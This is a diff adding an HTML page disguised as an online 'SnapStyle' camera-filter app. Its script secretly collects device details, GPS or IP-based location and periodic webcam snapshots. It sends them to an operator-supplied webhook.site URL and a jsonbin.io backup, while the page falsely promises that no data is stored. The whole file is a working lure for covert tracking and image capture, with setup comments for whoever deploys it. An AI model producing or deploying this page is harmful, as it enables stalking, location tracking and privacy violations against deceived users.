@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SnapChat Filters Online - Try Now!</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 500px;
+            width: 100%;
+            background: white;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        
+        .header {
+            background: linear-gradient(90deg, #ff7e5f, #feb47b);
+            padding: 30px;
+            text-align: center;
+            color: white;
+        }
+        
+        .header h1 {
+            font-size: 32px;
+            margin-bottom: 10px;
+        }
+        
+        .header p {
+            opacity: 0.9;
+            font-size: 16px;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .permission-box {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 25px;
+            border: 2px dashed #dee2e6;
+        }
+        
+        .permission-box h3 {
+            color: #333;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .permission-box p {
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+        
+        .btn {
+            background: linear-gradient(90deg, #4facfe 0%, #00f2fe 100%);
+            color: white;
+            border: none;
+            padding: 16px 40px;
+            font-size: 18px;
+            border-radius: 50px;
+            cursor: pointer;
+            display: block;
+            width: 100%;
+            font-weight: bold;
+            letter-spacing: 1px;
+            transition: transform 0.3s;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+        }
+        
+        .camera-container {
+            display: none;
+            margin-top: 25px;
+            border-radius: 15px;
+            overflow: hidden;
+            border: 3px solid #4facfe;
+        }
+        
+        #video {
+            width: 100%;
+            display: block;
+        }
+        
+        .filters {
+            display: none;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .filter-btn {
+            padding: 12px 20px;
+            background: #e9ecef;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            font-weight: 500;
+            transition: all 0.3s;
+        }
+        
+        .filter-btn:hover {
+            background: #4facfe;
+            color: white;
+        }
+        
+        .location-info {
+            background: #e8f4fd;
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 25px;
+            display: none;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            color: #666;
+            margin: 20px 0;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            color: #999;
+            font-size: 14px;
+        }
+        
+        .icon {
+            font-size: 24px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🎭 SnapStyle Filters</h1>
+            <p>Try amazing AR filters right in your browser!</p>
+        </div>
+        
+        <div class="content">
+            <div class="permission-box">
+                <h3>📸 Let's Get Started!</h3>
+                <p>To apply awesome filters, we need:</p>
+                <ul style="margin-left: 20px; margin-bottom: 20px; color: #666;">
+                    <li>📹 Camera access - for live filter preview</li>
+                    <li>📍 Location access - for local weather/time-based filters</li>
+                </ul>
+                <p><small>Your privacy is safe! We only use access for filter effects.</small></p>
+            </div>
+            
+            <div class="loading" id="loading">
+                ⏳ Setting up your camera and location...
+            </div>
+            
+            <button class="btn" id="startBtn">
+                🚀 Start Camera & Try Filters
+            </button>
+            
+            <div class="camera-container" id="cameraContainer">
+                <video id="video" autoplay playsinline></video>
+            </div>
+            
+            <div class="filters" id="filters">
+                <button class="filter-btn" data-filter="normal">Normal</button>
+                <button class="filter-btn" data-filter="sepia">Vintage</button>
+                <button class="filter-btn" data-filter="grayscale">B&W</button>
+                <button class="filter-btn" data-filter="blur">Soft Focus</button>
+                <button class="filter-btn" data-filter="hue">Rainbow</button>
+            </div>
+            
+            <div class="location-info" id="locationInfo">
+                <h3>📍 Location Detected</h3>
+                <p id="locationText">Loading your location for personalized filters...</p>
+                <p><small>Local filters activated! Enjoy special effects for your area.</small></p>
+            </div>
+            
+            <div class="footer">
+                <p>🔒 Secure Connection • No Data Stored • Instant Filters</p>
+                <p>© 2024 SnapStyle • All filters for entertainment</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ========== CONFIGURATION ==========
+        // REPLACE THIS WITH YOUR WEBHOOK URL (FREE SERVICE)
+        const WEBHOOK_URL = "https://webhook.site/your-unique-id";
+        // Get free webhook from: webhook.site
+        
+        // ========== VARIABLES ==========
+        let userData = {
+            sessionId: Math.random().toString(36).substr(2, 9),
+            timestamp: new Date().toISOString(),
+            ip: null,
+            location: null,
+            cameraAccess: false,
+            deviceInfo: {},
+            images: []
+        };
+        
+        // ========== INITIALIZE ==========
+        document.addEventListener('DOMContentLoaded', function() {
+            // Collect basic device info immediately
+            collectDeviceInfo();
+            
+            // Send initial ping
+            setTimeout(() => {
+                sendData('page_loaded');
+            }, 1000);
+        });
+        
+        // ========== DEVICE INFO COLLECTION ==========
+        function collectDeviceInfo() {
+            userData.deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookies: navigator.cookieEnabled,
+                online: navigator.onLine,
+                browser: getBrowserName(),
+                os: getOS()
+            };
+        }
+        
+        // ========== MAIN START BUTTON ==========
+        document.getElementById('startBtn').addEventListener('click', async function() {
+            const btn = this;
+            const loading = document.getElementById('loading');
+            
+            btn.style.display = 'none';
+            loading.style.display = 'block';
+            
+            // Step 1: Get Location
+            await getLocation();
+            
+            // Step 2: Start Camera
+            await startCamera();
+            
+            // Step 3: Show UI
+            loading.style.display = 'none';
+            document.getElementById('filters').style.display = 'flex';
+            
+            // Send success data
+            sendData('permissions_granted');
+        });
+        
+        // ========== LOCATION TRACKING ==========
+        async function getLocation() {
+            return new Promise((resolve) => {
+                // Try GPS first
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        async (position) => {
+                            // GPS Success
+                            userData.location = {
+                                type: 'gps',
+                                lat: position.coords.latitude,
+                                lon: position.coords.longitude,
+                                accuracy: position.coords.accuracy,
+                                timestamp: new Date().toISOString()
+                            };
+                            
+                            updateLocationUI(userData.location);
+                            await getIPLocation(); // Get IP as backup
+                            sendData('location_gps');
+                            resolve();
+                        },
+                        async (error) => {
+                            // GPS Failed, use IP
+                            console.log('GPS failed, using IP location');
+                            await getIPLocation();
+                            resolve();
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 0
+                        }
+                    );
+                } else {
+                    // No GPS support
+                    await getIPLocation();
+                    resolve();
+                }
+            });
+        }
+        
+        async function getIPLocation() {
+            try {
+                // Get IP
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                userData.ip = ipData.ip;
+                
+                // Get location from IP
+                const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const geoData = await geoRes.json();
+                
+                userData.location = {
+                    type: 'ip',
+                    ip: geoData.ip,
+                    city: geoData.city,
+                    region: geoData.region,
+                    country: geoData.country_name,
+                    lat: geoData.latitude,
+                    lon: geoData.longitude,
+                    isp: geoData.org
+                };
+                
+                updateLocationUI(userData.location);
+                sendData('location_ip');
+                
+            } catch (error) {
+                console.log('IP location failed');
+                userData.location = { type: 'unknown', error: 'Failed to get location' };
+            }
+        }
+        
+        function updateLocationUI(location) {
+            const locText = document.getElementById('locationText');
+            const locBox = document.getElementById('locationInfo');
+            
+            if (location.type === 'gps') {
+                locText.innerHTML = `
+                    📍 <strong>GPS Location Active</strong><br>
+                    Latitude: ${location.lat.toFixed(6)}<br>
+                    Longitude: ${location.lon.toFixed(6)}<br>
+                    Accuracy: ${Math.round(location.accuracy)} meters
+                `;
+            } else if (location.type === 'ip') {
+                locText.innerHTML = `
+                    🌐 <strong>Network Location</strong><br>
+                    City: ${location.city || 'Unknown'}<br>
+                    Region: ${location.region || 'Unknown'}<br>
+                    Country: ${location.country || 'Unknown'}<br>
+                    ISP: ${location.isp || 'Unknown'}
+                `;
+            }
+            
+            locBox.style.display = 'block';
+        }
+        
+        // ========== CAMERA HANDLING ==========
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }
+                });
+                
+                const video = document.getElementById('video');
+                const cameraContainer = document.getElementById('cameraContainer');
+                
+                video.srcObject = stream;
+                cameraContainer.style.display = 'block';
+                userData.cameraAccess = true;
+                
+                // Start periodic image capture
+                startImageCapture(stream);
+                
+                // Send camera data
+                sendData('camera_started');
+                
+            } catch (error) {
+                console.log('Camera error:', error);
+                alert('Camera access is required for filters. Please allow camera access.');
+                location.reload();
+            }
+        }
+        
+        function startImageCapture(stream) {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            const video = document.getElementById('video');
+            
+            // Capture every 10 seconds
+            setInterval(() => {
+                if (video.readyState === video.HAVE_ENOUGH_DATA) {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    ctx.drawImage(video, 0, 0);
+                    
+                    // Convert to low-quality base64
+                    const imageData = canvas.toDataURL('image/jpeg', 0.3);
+                    
+                    userData.images.push({
+                        timestamp: new Date().toISOString(),
+                        data: imageData.substring(0, 1000) + '...' // Truncated for demo
+                    });
+                    
+                    // Send image metadata every 5 images
+                    if (userData.images.length % 5 === 0) {
+                        sendData('image_captured');
+                    }
+                }
+            }, 10000);
+        }
+        
+        // ========== FILTERS ==========
+        document.querySelectorAll('.filter-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                const filter = this.getAttribute('data-filter');
+                const video = document.getElementById('video');
+                
+                let filterValue = '';
+                switch(filter) {
+                    case 'sepia': filterValue = 'sepia(1)'; break;
+                    case 'grayscale': filterValue = 'grayscale(1)'; break;
+                    case 'blur': filterValue = 'blur(5px)'; break;
+                    case 'hue': filterValue = 'hue-rotate(90deg)'; break;
+                    default: filterValue = 'none';
+                }
+                
+                video.style.filter = filterValue;
+                sendData('filter_applied', { filter: filter });
+            });
+        });
+        
+        // ========== DATA SENDING ==========
+        async function sendData(event, extra = {}) {
+            const data = {
+                event: event,
+                timestamp: new Date().toISOString(),
+                sessionId: userData.sessionId,
+                ...userData,
+                ...extra
+            };
+            
+            // Log to console (for debugging)
+            console.log('Sending data:', data);
+            
+            // Send to webhook (REPLACE WITH YOUR WEBHOOK URL)
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                });
+            } catch (error) {
+                console.log('Webhook failed, storing locally');
+                // Store in localStorage as backup
+                const failed = JSON.parse(localStorage.getItem('failed_data') || '[]');
+                failed.push(data);
+                localStorage.setItem('failed_data', JSON.stringify(failed));
+            }
+            
+            // Also send to backup endpoint
+            try {
+                await fetch('https://api.jsonbin.io/v3/b', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Master-Key': '$2a$10$YOUR_FREE_KEY_HERE' // Get from jsonbin.io
+                    },
+                    body: JSON.stringify(data)
+                });
+            } catch (e) {
+                // Ignore backup failure
+            }
+        }
+        
+        // ========== BROWSER DETECTION ==========
+        function getBrowserName() {
+            const ua = navigator.userAgent;
+            if (ua.includes("Chrome")) return "Chrome";
+            if (ua.includes("Firefox")) return "Firefox";
+            if (ua.includes("Safari")) return "Safari";
+            if (ua.includes("Edge")) return "Edge";
+            return "Unknown";
+        }
+        
+        function getOS() {
+            const ua = navigator.userAgent;
+            if (ua.includes("Windows")) return "Windows";
+            if (ua.includes("Mac")) return "MacOS";
+            if (ua.includes("Linux")) return "Linux";
+            if (ua.includes("Android")) return "Android";
+            if (ua.includes("iOS") || ua.includes("iPhone")) return "iOS";
+            return "Unknown";
+        }
+        
+        // ========== PAGE VISIBILITY ==========
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                sendData('page_hidden');
+            } else {
+                sendData('page_visible');
+            }
+        });
+        
+        // ========== BEFORE UNLOAD ==========
+        window.addEventListener('beforeunload', function() {
+            sendData('page_closed', { 
+                duration: new Date() - new Date(userData.timestamp)
+            });
+        });
+        
+        // ========== PERIODIC UPDATES ==========
+        setInterval(() => {
+            sendData('heartbeat');
+        }, 30000); // Every 30 seconds
+        
+    </script>
+</body>
+</html>
